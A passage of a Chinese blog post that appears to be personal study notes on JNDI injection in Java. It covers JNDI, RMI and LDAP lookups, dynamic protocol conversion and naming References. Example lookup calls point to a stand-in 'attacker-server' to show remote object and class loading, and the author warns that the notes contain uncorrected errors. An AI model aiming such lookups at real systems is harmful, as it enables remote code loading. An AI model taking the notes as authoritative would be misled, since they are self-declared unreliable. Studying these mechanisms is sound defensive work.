<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | Java学习笔记Ⅵ</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.111.1"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>Java学习笔记Ⅵ</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">JNDI注入相关慢通记录 | *有大量修正未同步，请勿参考本文学习</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&amp;SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/java>Java</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2022-06-20T15:25:44+08:00>2022-6-20 15:25</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#命名目录服务>命名&目录服务</a></li><li><a href=#jndi>JNDI</a><ul><li><a href=#示例>示例</a></li><li><a href=#动态协议转换>动态协议转换</a></li><li><a href=#命名引用>命名引用</a></li><li><a href=#远程代码库和安全管理器>远程代码库和安全管理器</a></li><li><a href=#结构>结构</a></li></ul></li><li><a href=#ldap>LDAP</a><ul><li><a href=#关键字>关键字</a></li></ul></li></ul><ul><li><a href=#攻击向量>攻击向量</a></li><li><a href=#安全管理器>安全管理器</a></li><li><a href=#rmireference>RMI+Reference</a></li><li><a href=#ldapreference>LDAP+Reference</a></li><li><a href=#rmi>RMI</a><ul><li><a href=#低版本>低版本</a></li><li><a href=#高版本>高版本</a></li></ul></li><li><a href=#ldap-1>LDAP</a><ul><li><a href=#低版本-1>低版本</a></li><li><a href=#高版本-1>高版本</a></li></ul></li><li><a href=#jndi-search>JNDI search</a><ul><li><a href=#已知漏洞>已知漏洞</a></li></ul></li><li><a href=#jndi-injection-exploit>JNDI-Injection-Exploit</a><ul><li><a href=#serverstart>ServerStart</a></li><li><a href=#jettyserver>JettyServer</a></li><li><a href=#ldaprefserver>LDAPRefServer</a></li><li><a href=#rmirefserver>RMIRefServer</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><p>仅学习记录自用，请勿作参考（</p><hr><h1 id=前置>前置</h1><h2 id=命名目录服务>命名&目录服务</h2><ul><li>命名服务是将名称与值相关联的实体，称为"绑定"。它提供了一种使用"find"或"search"操作来根据名称查找对象的便捷方式，比如DNS和RMI Registry</li><li>目录服务是一种特殊的命名服务，允许存储和搜索"目录对象"，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。</li></ul><h2 id=jndi>JNDI</h2><p>Java Naming and Directory Interface，是Java提供的API，包括Naming Service和Directory Service，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</p><ul><li><strong>原子名</strong>是一个简单、基本、不可分割的组成部分</li><li><strong>绑定</strong>是名称与对象的关联，每个绑定都有一个不同的原子名</li><li><strong>复合名</strong>包含零个或多个原子名，即由多个绑定组成</li><li><strong>上下文</strong>是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名</li><li>命名系统是一组关联的上下文</li><li>名称空间是命名系统中包含的所有名称</li><li>探索名称空间的起点称为初始上下文</li><li>要获取初始上下文，需要使用初始上下文工厂</li></ul><p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind，比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的<strong>JNDI动态协议转换</strong>。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。</p><h3 id=示例>示例</h3><ul><li>JNDI与RMI配合使用</li></ul><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Hashtable</span> <span style=color:#111>env</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Hashtable</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>INITIAL_CONTEXT_FACTORY</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>PROVIDER_URL</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;rmi://localhost:9999&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>(</span><span style=color:#111>env</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;refObj&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>RefObject</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//通过名称查找对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;refObj&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><ul><li>JNDI与LDAP配合使用</li></ul><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Hashtable</span> <span style=color:#111>env</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Hashtable</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>INITIAL_CONTEXT_FACTORY</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span> <span style=color:#d88200>&#34;com.sun.jndi.ldap.LdapCtxFactory&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>PROVIDER_URL</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;ldap://localhost:1389&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>DirContext</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialDirContext</span><span style=color:#f92672>(</span><span style=color:#111>env</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Object</span> <span style=color:#111>local_obj</span> <span style=color:#f92672>=</span> <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;cn=foo,dc=test,dc=org&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><h3 id=动态协议转换>动态协议转换</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;rmi://attacker-server/refObj&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//ctx.lookup(&#34;ldap://attacker-server/cn=bar,dc=test,dc=org&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>//ctx.lookup(&#34;iiop://attacker-server/bar&#34;);
</span></span></span></code></pre></div><p>上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据传递的URL协议自动转换与设置了对应的工厂与PROVIDER_URL</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Hashtable</span> <span style=color:#111>env</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Hashtable</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>INITIAL_CONTEXT_FACTORY</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>env</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>Context</span><span style=color:#f92672>.</span><span style=color:#75af00>PROVIDER_URL</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;rmi://localhost:9999&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>(</span><span style=color:#111>env</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>String</span> <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;ldap://attacker-server/cn=bar,dc=test,dc=org&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//通过名称查找对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>即使服务端提前设置了工厂与PROVIDER_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换</p><p>在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>getURLOrDefaultInitCtx</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>).</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>protected</span> <span style=color:#111>Context</span> <span style=color:#75af00>getURLOrDefaultInitCtx</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>NamingManager</span><span style=color:#f92672>.</span><span style=color:#75af00>hasInitialContextFactoryBuilder</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span><span style=color:#75715e>//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>return</span> <span style=color:#111>getDefaultInitCtx</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#111>String</span> <span style=color:#111>scheme</span> <span style=color:#f92672>=</span> <span style=color:#111>getURLScheme</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>);</span><span style=color:#75715e>//尝试从名称解析URL中的协议
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>scheme</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#111>NamingManager</span><span style=color:#f92672>.</span><span style=color:#75af00>getURLContext</span><span style=color:#f92672>(</span><span style=color:#111>scheme</span><span style=color:#f92672>,</span> <span style=color:#111>myProps</span><span style=color:#f92672>);</span><span style=color:#75715e>//如果解析出了Schema协议，则尝试获取其对应的上下文环境
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>ctx</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>   <span style=color:#00a8c8>return</span> <span style=color:#111>ctx</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>getDefaultInitCtx</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=命名引用>命名引用</h3><p>为了在命名或目录服务中绑定Java对象，可以使用Java序列化传输对象，例如上面示例的第一个例子，将一个对象绑定到了远程服务器，就是通过反序列化将对象传输过去的。但是，并非总是通过序列化去绑定对象，因为它可能太大或不合适。为了满足这些需求，JNDI定义了命名引用，以便对象可以通过绑定由命名管理器解码并解析为原始对象的一个引用间接地存储在命名或目录服务中。</p><p>引用由Reference类表示，并且由地址和有关被引用对象的类信息组成，每个地址都包含有关如何构造对象。</p><p>Reference可以使用工厂来构造对象。当使用lookup查找对象时，Reference将使用工厂提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Reference</span> <span style=color:#111>reference</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;MyClass&#34;</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;MyClass&#34;</span><span style=color:#f92672>,</span><span style=color:#111>FactoryURL</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>ReferenceWrapper</span> <span style=color:#111>wrapper</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ReferenceWrapper</span><span style=color:#f92672>(</span><span style=color:#111>reference</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Foo&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>wrapper</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><h3 id=远程代码库和安全管理器>远程代码库和安全管理器</h3><p>在JNDI栈中，不是所有的组件都被同等对待。当验证从何处加载远程类时JVM的行为不同。从远程加载类有两个不同的级别：</p><ul><li>命名管理器级别</li><li>服务提供者接口（SPI）级别</li></ul><p>JNDI体系结构：</p><p><img src=https://images.seebug.org/content/images/2019/12/05/1575516121000-13.png-w331s alt=img></p><p>在SPI级别，JVM将允许从远程代码库加载类并实施安全性。管理器的安装取决于特定的提供程序（例如在上面说到的RMI那些利用方式就是SPI级别，必须设置安全管理器）：</p><table><thead><tr><th style=text-align:left>Provider</th><th style=text-align:left>Property to enable remote class loading</th><th style=text-align:left>是否需要强制安装Security Manager</th></tr></thead><tbody><tr><td style=text-align:left>RMI</td><td style=text-align:left>java.rmi.server.useCodebaseOnly = false (<strong>JDK 6u45、JDK 7u21之后默认为true</strong>)</td><td style=text-align:left>需要</td></tr><tr><td style=text-align:left>LDAP</td><td style=text-align:left>com.sun.jndi.ldap.object.trustURLCodebase = true（default = false）</td><td style=text-align:left>非必须</td></tr><tr><td style=text-align:left>CORBA</td><td style=text-align:left></td><td style=text-align:left>需要</td></tr></tbody></table><p>但是，在Naming Manager层放宽了安全控制。解码JNDI命名时始终允许引用从远程代码库加载类，而没有JVM选项可以禁用它，并且不需要强制安装任何安全管理器，例如上面说到的命名引用那种方式。</p><h3 id=结构>结构</h3><p>在<code>Java JDK</code>里面提供了5个包，提供给<code>JNDI</code>的功能实现，分别是：</p><ul><li>javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</li><li>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</li><li>javax.naming.event：在命名目录服务器中请求事件通知；</li><li>javax.naming.ldap：提供LDAP支持；</li><li>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</li></ul><h4 id=initialcontext>InitialContext</h4><p>构造</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//构建一个初始上下文。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>InitialContext</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//构造一个初始上下文，并选择不初始化它。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>InitialContext</span><span style=color:#f92672>(</span><span style=color:#00a8c8>boolean</span> <span style=color:#111>lazy</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//使用提供的环境构建初始上下文。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>InitialContext</span><span style=color:#f92672>(</span><span style=color:#111>Hashtable</span><span style=color:#f92672>&lt;?,?&gt;</span> <span style=color:#111>environment</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>常用方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//将名称绑定到对象。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>bind</span><span style=color:#f92672>(</span><span style=color:#111>Name</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>list</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//检索命名对象。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>lookup</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//将名称绑定到对象，覆盖任何现有绑定。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>rebind</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//取消绑定命名对象。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>unbind</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>示例</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.InitialContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.NamingException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>jndi</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>uri</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;rmi://127.0.0.1:1099/work&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>//在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>InitialContext</span> <span style=color:#111>initialContext</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>initialContext</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#111>uri</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h4 id=reference>Reference</h4><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用，提供了<code>JNDI</code>中类的引用功能</p><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naiming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI LDAP等</p><p>构造</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//为类名为“className”的对象构造一个新的引用。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>className</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//为类名为“className”的对象和地址构造一个新引用。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>className</span><span style=color:#f92672>,</span> <span style=color:#111>RefAddr</span> <span style=color:#111>addr</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>className</span><span style=color:#f92672>,</span> <span style=color:#111>RefAddr</span> <span style=color:#111>addr</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>factory</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>factoryLocation</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>Reference</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>className</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>factory</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>factoryLocation</span><span style=color:#f92672>)</span>
